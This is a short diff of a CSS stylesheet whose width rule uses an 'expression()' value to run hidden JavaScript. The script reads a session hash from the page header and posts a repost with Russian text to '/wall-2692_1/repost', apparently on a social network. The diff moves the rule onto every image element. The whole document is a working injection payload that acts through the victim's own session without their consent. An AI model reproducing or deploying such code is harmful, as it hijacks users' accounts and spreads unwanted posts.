@@ -1,3 +1,3 @@
-#dm {
+img {
   width: expression(hash=document.querySelectorAll("body > div.layout > div.page_header > div > div:nth-child(6) > a")[0].getAttribute("href").split("=")[1],(xhr=new XMLHttpRequest).open("POST","/wall-2692_1/repost?hash="+hash,!0),xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded"),xhr.onload=function(){},xhr.send("text=%D0%9A%D0%B0%D0%BA%D0%B0%D0%BE%20%D0%BF%D1%80%D0%BE%D0%BA%D0%B0%D0%BA%D0%B0%D0%BB%D0%BE%D1%81%D1%8C");)
     }
